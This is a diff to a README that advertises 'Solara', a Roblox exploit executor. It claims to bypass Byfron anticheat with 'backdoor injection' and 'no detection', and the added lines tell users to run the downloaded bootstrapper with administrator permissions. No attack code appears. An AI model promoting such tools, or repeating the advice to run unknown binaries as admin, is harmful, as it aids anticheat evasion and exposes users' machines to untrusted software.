@@ -7,11 +7,11 @@
 ## INFO
 ![Banner](img/Screenshot_2024-06-18-15-58-34-718_com.discord.png)
 
-## ABOUT
+## ABOUT 
 Solara is a powerful Roblox Level 3 FOSS (Free and Open Source) exploit tool developed since 2023. It is one of the most popular Roblox executors with the largest exploit community. It is currently **UNDETECTABLE** by Byfron (Roblox Anticheat).
 
 
-## STATISTICS
+## STATISTICS 📈
 • 50,000 **Monthly Active users**
 
 • 1,000,000 **Total downloads**
@@ -21,28 +21,28 @@ Solara is a powerful Roblox Level 3 FOSS (Free and Open Source) exploit tool dev
 ## FEATURES
 [![Version](https://img.shields.io/badge/Presenting-darkgreen.svg?maxAge=259200)]()
 
-- **Improved bootstrapper.** 
+- **✔️ Improved bootstrapper.** 
    - _**Extra customizability** options and **advanced settings** included._ 
-- **Enhanced backdoor injection.** - 
-    
-   - *No detection **GURANTEE***
-- **Generate payloads in various formats.** 
-   - _Save your scripts in lua, txt or any other format_
-- **Bypassed Byfron.** 
+- **✔️ Enhanced backdoor injection.** - 
+   - *✔No detection assurance.**
+- **✔️ Generate payloads in various formats.** 
+   - _Save your scripts in .lua, .txt or any other format._
+- **✔️ Bypassed Byfron.** 
    - (Works in base Roblox Client. **0 detections** reported by over 50,000 active users.)
-- **New GUI.** 
+- **✔️ New GUI.** 
     - _Seamless GUI developed based upon minimalist principles._ 
-- **Ability to search for updated scripts.** 
-    
-   - _**Built in script library** for ease of access._ 
-- **Automatically runs injector**
+- **✔️ Ability to search for updated scripts.** 
+   - _**✔️ Built in script library** for ease of access._ 
+- **✔️ Automatically runs injector**
    - _(configurable in settings)._
-- **keyless executor.** 
-  - _**No key-system required**. Community funded and developed._
-- **52% Unc Support**: 
+- **✔️ keyless executor.** 
+  - _**✔️ No key-system required**. Community funded and developed._
+- **✔️ 52% Unc Support**: 
   - _Benefit from unparalleled support with the Solara Executor._
-- **Ad-free installation guidance.** - 
-- **Free Level 3 Executor**: 
+- **✔️ Ad-free installation guidance.** 
+- **✔️ Free Level 3 Executor**
+
+![https://www.google.com/url?sa=i&url=https%3A%2F%2Fsolara-executor.com%2F&psig=AOvVaw0RO1sLeOXe77utuzB0Tv0K&ust=1718825017295000&source=images&cd=vfe&opi=89978449&ved=0CA8QjRxqFwoTCKCTqa7w5YYDFQAAAAAdAAAAABAE](GUI)
 
 
 
@@ -71,6 +71,9 @@ After that, unzip the file using WinRAR or 7-Zip.
 1. Open your Roblox Process.
 2. Navigate to 'SolaraBootstrapper'
 3. Right click and run the file **WITH _Admistrator_** permissions 
+
+> [!TIP]
+> Running with admistrator permissions helps fix injection issues. 
 
 ### Q&A
 
